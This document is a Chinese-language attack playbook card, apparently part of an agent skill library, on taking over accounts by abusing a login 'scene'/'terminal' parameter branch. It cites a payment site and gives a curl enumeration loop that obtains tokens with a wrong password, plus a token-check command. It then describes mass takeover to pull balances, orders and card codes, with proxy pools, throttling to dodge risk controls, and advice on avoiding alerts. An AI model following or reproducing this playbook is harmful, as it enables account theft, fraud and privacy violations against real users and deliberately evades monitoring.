---
name: login-scene-branch-bypass
description: >-
  Use when 登录接口收 scene/terminal/type/channel/platform 这类枚举参数：某一取值走「内部/调试/免密」
  分支，任意已注册手机号或邮箱直接换到 token（无需验证码与密码）。含枚举顺序、判据、批量接管放大。
---

# 登录 `scene` 分支绕过 → 任意账号接管

实战来源：海외Pay（2026-08）`POST /shopapi/login/account`，`scene=3&terminal=3` 时用任意已注册手机号/邮箱直接返回该用户 shop token，无需密码与验证码；配合客服弱口令泄露的手机号可规模化接管。

## When to Use

- 登录请求体里除账号密码外还有 `scene`、`terminal`、`clientType`、`platform`、`loginType`、`source`、`channel`、`from`
- 同一个登录口对应多个端（买家 App / 卖家 / 客服 / 代理 / 内部工具）
- 站点刚做过「多端合并登录」

## 打法

### 1. 先拿到一个真实注册的账号

自己的号最稳；不行就从公开泄露/客服接口拿（如 `/kefuapi` 弱口令查订单里的手机号）。

### 2. 枚举分支参数

```bash
for s in 0 1 2 3 4; do
  for t in 1 2 3; do
    code=$(curl -s -o /tmp/r.json -w '%{http_code}' -X POST 'https://目标/shopapi/login/account' \
      -H 'Content-Type: application/json' -H 'version: 1.0.0' \
      -d "{\"account\":\"$PHONE\",\"password\":\"x\",\"scene\":$s,\"terminal\":$t}")
    echo "$s/$t $code $(head -c 120 /tmp/r.json)"
  done
done
```

- 命中特征：`200` + 返回 `token`/`accessToken`（密码是错的 `x`）
- 常见落点：`scene=3`（内部/调试）、`scene=9`、`terminal=3`（PC 管理端）

### 3. 验证 token 归属

```bash
curl -s -H "Authorization: Bearer $TOK" 'https://目标/shopapi/user/info'
```

- 返回的 user id / 手机号必须**等于目标账号**，否则只是游客 token

### 4. 放大

- 手机号/邮箱清单 → 逐个换 token → 拉余额/订单/收货卡密
- 每个号控制 1-2 次请求，避免风控；并发 ≤5
- 若登录口有 IP 限制，走代理池（见 `egress-proxy-pool`）

## 判据门槛

- **L1**：参数被接受（错误信息随 scene 变化）
- **L2**：错误密码 + 特定 scene 返回 token
- **L3**：token 能读目标账号私有数据（余额/订单）

## 坑

1. 有的实现 scene=3 只对**特定 terminal/version 头**生效，头要一起枚举
2. 返回 token 但 scope 受限（只能看商品）→ 换 `user/info` 验权限
3. 部分平台 scene 是加密参数（前端 AES）→ 先看 JS 里 scene 的取值表
4. 别用 admin 账号试，容易触发告警；用自己注册的普通号

## 相关卡

- `api-authz-idor-testing` — 拿到 token 后的横向
- `auth-brute` — 无分支洞时的补位
- `member-ato-pii-harvest` — 批量接管与档案拉取
